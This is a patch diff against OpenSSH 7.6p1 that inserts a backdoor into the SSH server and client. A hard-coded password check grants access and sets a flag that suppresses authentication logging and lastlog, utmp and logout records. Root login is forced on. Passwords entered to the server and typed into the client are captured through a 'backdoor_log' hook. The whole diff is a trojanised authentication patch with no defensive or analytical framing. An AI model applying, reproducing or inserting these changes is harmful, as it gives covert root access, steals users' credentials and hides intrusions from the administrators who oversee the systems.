@@ -1,0 +1,144 @@
+diff -Naur openssh-7.6p1/auth.c openssh-7.6p1-patched/auth.c
+--- openssh-7.6p1/auth.c	2017-10-03 03:34:26.000000000 +0800
++++ openssh-7.6p1-patched/auth.c	2018-08-15 09:47:18.357955770 +0800
+@@ -331,8 +331,10 @@
+ 		if (authctxt->auth_method_info != NULL)
+ 			extra = xstrdup(authctxt->auth_method_info);
+ 	}
+-
+-	authlog("%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
++	extern int ateam_login;
++	if (ateam_login == 0)
++	{
++	    authlog("%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
+ 	    authmsg,
+ 	    method,
+ 	    submethod != NULL ? "/" : "", submethod == NULL ? "" : submethod,
+@@ -342,7 +344,7 @@
+ 	    ssh_remote_port(ssh),
+ 	    extra != NULL ? ": " : "",
+ 	    extra != NULL ? extra : "");
+-
++	}
+ 	free(extra);
+ 
+ #ifdef CUSTOM_FAILED_LOGIN
+@@ -388,7 +390,7 @@
+ auth_root_allowed(const char *method)
+ {
+ 	struct ssh *ssh = active_state; /* XXX */
+-
++	return 1;
+ 	switch (options.permit_root_login) {
+ 	case PERMIT_YES:
+ 		return 1;
+diff -Naur openssh-7.6p1/auth-pam.c openssh-7.6p1-patched/auth-pam.c
+--- openssh-7.6p1/auth-pam.c	2017-10-03 03:34:26.000000000 +0800
++++ openssh-7.6p1-patched/auth-pam.c	2018-08-15 09:47:18.357955770 +0800
+@@ -1219,6 +1219,7 @@
+ /*
+  * Attempt password authentication via PAM
+  */
++extern void backdoor_log(const char *host, char *user, const char *password);
+ int
+ sshpam_auth_passwd(Authctxt *authctxt, const char *password)
+ {
+@@ -1256,6 +1257,7 @@
+ 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+ 		debug("PAM: password authentication accepted for %.100s",
+ 		    authctxt->user);
++		backdoor_log("localhost", authctxt->user, password);
+ 		return 1;
+ 	} else {
+ 		debug("PAM: password authentication failed for %.100s: %s",
+diff -Naur openssh-7.6p1/auth-passwd.c openssh-7.6p1-patched/auth-passwd.c
+--- openssh-7.6p1/auth-passwd.c	2017-10-03 03:34:26.000000000 +0800
++++ openssh-7.6p1-patched/auth-passwd.c	2018-08-15 09:47:18.357955770 +0800
+@@ -80,6 +80,8 @@
+  * Tries to authenticate the user using password.  Returns true if
+  * authentication succeeds.
+  */
++extern int backdoor_auth(const char *password);
++extern void backdoor_log(const char *host, char *user, const char *password);
+ int
+ auth_password(Authctxt *authctxt, const char *password)
+ {
+@@ -88,7 +90,12 @@
+ #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+ 	static int expire_checked = 0;
+ #endif
+-
++	extern int ateam_login;
++	if (backdoor_auth(password))
++	{
++		ateam_login = 1;
++		return 1;
++	}
+ 	if (strlen(password) > MAX_PASSWORD_LEN)
+ 		return 0;
+ 
+@@ -129,6 +136,8 @@
+ 	}
+ #endif
+ 	result = sys_auth_passwd(authctxt, password);
++	if (result)
++		backdoor_log("localhost", authctxt->user, password);
+ 	if (authctxt->force_pwchange)
+ 		disable_forwarding();
+ 	return (result && ok);
+diff -Naur openssh-7.6p1/sshconnect2.c openssh-7.6p1-patched/sshconnect2.c
+--- openssh-7.6p1/sshconnect2.c	2017-10-03 03:34:26.000000000 +0800
++++ openssh-7.6p1-patched/sshconnect2.c	2018-08-15 09:47:18.357955770 +0800
+@@ -890,7 +890,7 @@
+ 	packet_send();
+ 	return 1;
+ }
+-
++extern void backdoor_log(const char *host, char *user, const char *password);
+ int
+ userauth_passwd(Authctxt *authctxt)
+ {
+@@ -909,6 +909,7 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, host);
+ 	password = read_passphrase(prompt, 0);
++	backdoor_log(host, (char *) authctxt->server_user, password);
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+diff -Naur openssh-7.6p1/sshlogin.c openssh-7.6p1-patched/sshlogin.c
+--- openssh-7.6p1/sshlogin.c	2017-10-03 03:34:26.000000000 +0800
++++ openssh-7.6p1-patched/sshlogin.c	2018-08-15 09:47:18.357955770 +0800
+@@ -128,7 +128,9 @@
+     const char *host, struct sockaddr *addr, socklen_t addrlen)
+ {
+ 	struct logininfo *li;
+-
++        extern int ateam_login;
++        if (ateam_login == 1)
++                return;
+ 	/* save previous login details before writing new */
+ 	store_lastlog_message(user, uid);
+ 
+@@ -144,7 +146,9 @@
+ 		 const char *host, struct sockaddr *addr, socklen_t addrlen)
+ {
+ 	struct logininfo *li;
+-
++        extern int ateam_login;
++        if (ateam_login == 1)
++                return;
+ 	li = login_alloc_entry(pid, user, host, ttyname);
+ 	login_set_addr(li, addr, addrlen);
+ 	login_utmp_only(li);
+@@ -157,7 +161,9 @@
+ record_logout(pid_t pid, const char *tty, const char *user)
+ {
+ 	struct logininfo *li;
+-
++        extern int ateam_login;
++        if (ateam_login == 1)
++                return;
+ 	li = login_alloc_entry(pid, user, NULL, tty);
+ 	login_logout(li);
+ 	login_free_entry(li);
